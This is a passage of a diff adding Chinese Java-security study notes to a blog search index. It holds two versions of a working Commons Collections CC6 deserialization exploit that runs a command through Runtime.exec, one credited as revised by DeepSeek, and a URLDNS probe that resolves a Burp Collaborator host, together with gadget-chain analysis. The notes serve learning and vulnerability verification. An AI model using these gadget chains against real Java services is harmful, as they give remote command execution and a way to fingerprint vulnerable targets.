+import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc2 &#123;    public static void main(String[] args) throws Exception &#123;        // 1. 构造恶意 Transformer 链        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,                        new Class[]&#123;String.class, Class[].class&#125;,                        new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;,                        new Class[]&#123;Object.class, Object[].class&#125;,                        new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;,                        new Class[]&#123;String.class&#125;,                        new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        // 先用一个无害的链填充，put 完成后再通过反射换成恶意链，避免 put 时就触发        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);        // 2. 用 LazyMap 装饰 HashMap        Map&lt;Object, Object&gt; innerMap = new HashMap&lt;&gt;();        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(innerMap, chainedTransformer);        // 3. TiedMapEntry 持有 lazyMap，key 任意        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;niao&quot;);        // 4. 外层 HashMap：put 时会调用 key.hashCode()        HashMap&lt;Object, Object&gt; cc2hashmap = new HashMap&lt;&gt;();        cc2hashmap.put(tiedMapEntry, &quot;thankyou&quot;);        // 5. 关键坑：put 时 TiedMapEntry.hashCode() 会调用 lazyMap.get(&quot;niao&quot;)，        //    LazyMap 会把 &quot;niao&quot; 作为 key 放进 innerMap（即使没触发 transform 也会占位）。        //    这样反序列化时 TiedMapEntry.hashCode() 再次 get 会命中缓存，不会调用 transform。        //    因此必须把 innerMap 里的 &quot;niao&quot; 删掉。        innerMap.remove(&quot;niao&quot;);        // 6. 反射把恶意链写回 ChainedTransformer 的 iTransformers 字段        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        f.setAccessible(true);        f.set(chainedTransformer, transformers);        // 7. 序列化        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(cc2hashmap);        oos.close();        byte[] payload = baos.toByteArray();        // 8. 反序列化（触发计算器）        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));        ois.readObject();    &#125;&#125;
+
+实验修正与最终代码这是最终的exp，可以看到DeepSeek进行了一些修改，我们反思一下
+很严重的问题我们不进行序列化反序列化他就执行命令了，我们执行put的时候依次执行hash，hashcode，getvalue，get，到get这一步的时候对象是lazymap，确定key是没有被保存过的就执行get然后再执行transform他出计算器，这个流程我们预想应该发生在反序列化的时候。然后map保存之后key就存在在hashmap里了。
+import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.xml.crypto.dsig.Transform;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc2 &#123;    public static void main(String[] args) throws Exception &#123;        HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();//        Runtime runtime = Runtime.getRuntime();//        InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);        Transformer[] transformers = &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(&quot;This is fake!!!&quot;)&#125;);        Map decorate = LazyMap.decorate(objectObjectHashMap, chainedTransformer);        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;niao&quot;);//        tiedMapEntry.getValue();        HashMap&lt;Object, Object&gt; cc2hashmap = new HashMap&lt;&gt;();        cc2hashmap.put(tiedMapEntry,&quot;thankyou&quot;);        objectObjectHashMap.remove(&quot;niao&quot;);        Field iTransformers = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        iTransformers.setAccessible(true);        iTransformers.set(chainedTransformer,transformers);        // 序列化        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(cc2hashmap);        oos.close();        // 反序列化（触发）        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));        ois.readObject();    &#125;&#125;
+这是我最终完成的exp，修改了两个问题，一个是在put之后niao就被保存咋hashmap中了导致反序列化不会执行命令。另外一个就是保证在反序列化之前不执行命令保证链条的干净流畅性，所以我们put的是一个干净的chaintransformer，put之后我们通过反射把这个chaintransformer修改成恶意的，保证在反序列化的过程中可以执行。这一切的重点都在lazymap的get方法那里，如果以后想不起来了就去看这个代码。
+学习回顾好的最后时间我们来总结一下我们的学习成果，首先链尾相比之前没有变化还是从invoketransformer出发，通过他的transform方法我们找到了lazymap的get方法调用了，然后接着找我们发信啊tiedmapentry里面的getvalue方法调用了get，然后同类中的hashcode调用了getvalue，然后hashmap里面的put调用了hash，hash调用了hashcode，这样的话我么就连成一条完整的线了。
+在分析过程中要充分考虑java的多态这个特点，这是我们分析的关键也是不可缺少的思维。学完cc1之后果然学cc6快了很多。据听说cc6是最常用的链条。
+
+本系列笔记： Java安全学习 · Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记 · cc1链学习 · 正版cc1链学习 · cc3链学习 · cc6链学习
+]]></content>
+      <categories>
+        <category>安全学习</category>
+        <category>Java 反序列化</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>反序列化</tag>
+        <tag>CC6</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>my-first-blog</title>
     <url>/2025/07/16/my-first-blog/</url>
     <content><![CDATA[这是我的第一个博客，我将在这里分享我学习网络安全相关知识以及一些有趣的内容
 ]]></content>
+  </entry>
+  <entry>
+    <title>Java 安全学习</title>
+    <url>//2026/11/01/java-security-urldns/</url>
+    <content><![CDATA[一、Java-IO 流什么是 IO 流Java 程序是在内存中工作的，数据需要先读入内存才能被处理，这就是输入流（Input）；内存具有易失性，无法长期保存数据，处理完后再写出去，这就是输出流（Output）。二者合称 Java 的 IO 流。
+Java IO 流的四个抽象类：
+
+
+
+类型
+输入
+输出
+
+
+
+字节流
+InputStream
+OutputStream
+
+
+字符流
+Reader
+Writer
+
+
+二、URLDNS 链URLDNS 是 ysoserial 里最简单的一条 Java 反序列化利用链，仅依赖 JDK 内置类（HashMap + URL），无需任何第三方库。原理是：反序列化时触发 HashMap 对 key 的 hash 计算，最终调用到 URL 的 DNS 解析，让目标发起一次 DNS 请求，用于验证反序列化漏洞是否存在。
+1. 复现代码import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNSDemo &#123;    public static void main(String[] args) throws Exception &#123;        // 创建 hashmap        HashMap&lt;URL, String&gt; map = new HashMap&lt;&gt;();        // 创建 URL，指向 dnslog 监听地址        URL url = new URL(&quot;http://389bc0vjl0yj9vgj73x0nk8970ds1ip7.oastify.com&quot;);        // 通过反射获取 URL 的私有字段 hashCode        Field field = URL.class.getDeclaredField(&quot;hashCode&quot;);        field.setAccessible(true);        // 关键：put 之前先把 hashCode 设为非 -1，避免 put 时直接触发 DNS 解析        field.set(url, 123456);        // 将 URL 对象放入 hashmap        map.put(url, &quot;test&quot;);        // 序列化之前再改回 -1，让反序列化时能走到 DNS 解析分支        field.set(url, -1);        // 序列化        ObjectOutputStream oos =                new ObjectOutputStream(new FileOutputStream(&quot;urldns.ser&quot;));        oos.writeObject(map);        oos.close();        System.out.println(&quot;序列化完成&quot;);        // 反序列化        ObjectInputStream ois =                new ObjectInputStream(new FileInputStream(&quot;urldns.ser&quot;));        Object obj = ois.readObject();        ois.close();        System.out.println(&quot;反序列化完成：&quot; + obj.getClass());    &#125;&#125;
+
+2. 复现结果成功出现 DNS 解析记录：
+
+3. 利用链分析第一步：put 入口当程序运行到 map.put(url, &quot;test&quot;) 时，跟进 put 方法，发现它对 key 做了 hash 操作：
+public V put(K key, V value) &#123;    return putVal(hash(key), key, value, false, true);&#125;
+
+第二步：hash 计算跟进 hash 方法，只要 key 不为 null，就调用 key.hashCode() 计算哈希值：
+static final int hash(Object key) &#123;    int h;    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;
+
+第三步：URL.hashCode跟进 hashCode 方法，发现只有当 hashCode 为 -1 时才会触发 DNS 查询：
+public synchronized int hashCode() &#123;    if (hashCode != -1)        return hashCode;    hashCode = handler.hashCode(this);    return hashCode;&#125;
+
+
+这正是前面反射处理 hashCode 的原因：put 前设成非 -1 让 hash 计算「短路」，序列化前再改回 -1，把「触发」留给反序列化。
+
+第四步：反序列化入口 readObject反序列化的入口是 readObject：
+ObjectInputStream ois =        new ObjectInputStream(new FileInputStream(&quot;urldns.ser&quot;));Object obj = ois.readObject();ois.close();
+
+这是 HashMap 类自己重写的 readObject，我们进入 HashMap 源码：
+private void readObject(ObjectInputStream s)    throws IOException, ClassNotFoundException &#123;    ObjectInputStream.GetField fields = s.readFields();    // Read loadFactor (ignore threshold)    float lf = fields.get(&quot;loadFactor&quot;, 0.75f);    if (lf &lt;= 0 || Float.isNaN(lf))        throw new InvalidObjectException(&quot;Illegal load factor: &quot; + lf);    lf = Math.min(Math.max(0.25f, lf), 4.0f);    HashMap.UnsafeHolder.putLoadFactor(this, lf);    reinitialize();    s.readInt();                // Read and ignore number of buckets    int mappings = s.readInt(); // Read number of mappings (size)    if (mappings &lt; 0) &#123;        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings);    &#125; else if (mappings == 0) &#123;        // use defaults    &#125; else if (mappings &gt; 0) &#123;        float fc = (float)mappings / lf + 1.0f;        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                   DEFAULT_INITIAL_CAPACITY :                   (fc &gt;= MAXIMUM_CAPACITY) ?                   MAXIMUM_CAPACITY :                   tableSizeFor((int)fc));        float ft = (float)cap * lf;        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                     (int)ft : Integer.MAX_VALUE);        // Check Map.Entry[].class since it&#x27;s the nearest public type to        // what we&#x27;re actually creating.        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];        table = tab;        // Read the keys and values, and put the mappings in the HashMap        for (int i = 0; i &lt; mappings; i++) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K) s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V) s.readObject();            putVal(hash(key), key, value, false, false);        &#125;    &#125;&#125;
+
+可以看到最后一行 putVal(hash(key), ...)，这里又调用了 hash，这就是反序列化时的触发入口。后续就与 put 时的流程一样，进入 URL 类的 hashCode 检查：
+public synchronized int hashCode() &#123;    if (hashCode != -1)        return hashCode;    hashCode = handler.hashCode(this);    return hashCode;&#125;
+
+第五步：handler 的 hashCode此时 hashCode 为 -1，走到 handler.hashCode(this)。handler 是 URLStreamHandler 类型的字段：
+transient URLStreamHandler handler;/* Our hash code. */private int hashCode = -1;private transient UrlDeserializedState tempState;
+
+具体的协议 Handler（如 HTTP）没有重写 hashCode，所以调用的是父类 URLStreamHandler 里的实现：
+protected int hashCode(URL u) &#123;    int h = 0;    // Generate the protocol part.    String protocol = u.getProtocol();    if (protocol != null)        h += protocol.hashCode();    // Generate the host part.    InetAddress addr = getHostAddress(u);    if (addr != null) &#123;        h += addr.hashCode();    &#125; else &#123;        String host = u.getHost();        if (host != null)            h += host.toLowerCase().hashCode();    &#125;    // Generate the file part.    String file = u.getFile();    if (file != null)        h += file.hashCode();    // Generate the port part.    if (u.getPort() == -1)        h += getDefaultPort();    else        h += u.getPort();    // Generate the ref part.    String ref = u.getRef();    if (ref != null)        h += ref.hashCode();    return h;&#125;
+
+第六步：getHostAddress 触发 DNS上面 host 部分的计算调用了 getHostAddress(u)：
+protected InetAddress getHostAddress(URL u) &#123;    return u.getHostAddress();&#125;
+
+进一步跟进 URL.getHostAddress()：
+synchronized InetAddress getHostAddress() &#123;    if (hostAddress != null) &#123;        return hostAddress;    &#125;    if (host == null || host.isEmpty()) &#123;        return null;    &#125;    try &#123;        hostAddress = InetAddress.getByName(host);    &#125; catch (UnknownHostException | SecurityException ex) &#123;        return null;    &#125;    return hostAddress;&#125;
+
+其中的 InetAddress.getByName(host) 就是发起 DNS 解析的关键调用。
+4. 调用链总结HashMap.readObject()    └── hash(key)        └── URL.hashCode()                 // hashCode == -1 才继续            └── URLStreamHandler.hashCode(URL)                └── URL.getHostAddress()                    └── InetAddress.getByName(host)   // 触发 DNS 查询
+
+5. 环境与注意事项
+
+
+事项
+说明
+
+
+
+JDK 版本
+JDK 8 直接可用；JDK 17+ 需加 --add-opens java.base/java/net=ALL-UNNAMED
+
+
+DNS 监听平台
+可用 dnslog.cn（免费）或 Burp Collaborator（*.oastify.com，需专业版）
+
+
+反射处理
+put 前设非 -1（防提前触发），序列化前改回 -1（留给反序列化触发）
+
+
+ser 文件可复用
+每次 readObject() 都会重新触发一次 DNS；同一 JVM 内因 InetAddress 缓存可能只触发一次
+
+
+
+本系列笔记： Java安全学习 · Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记 · cc1链学习 · 正版cc1链学习 · cc3链学习 · cc6链学习
+]]></content>
+      <categories>
+        <category>安全学习</category>
+        <category>Java 反序列化</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+        <tag>反序列化</tag>
+        <tag>URLDNS</tag>
+      </tags>
   </entry>
 </search>
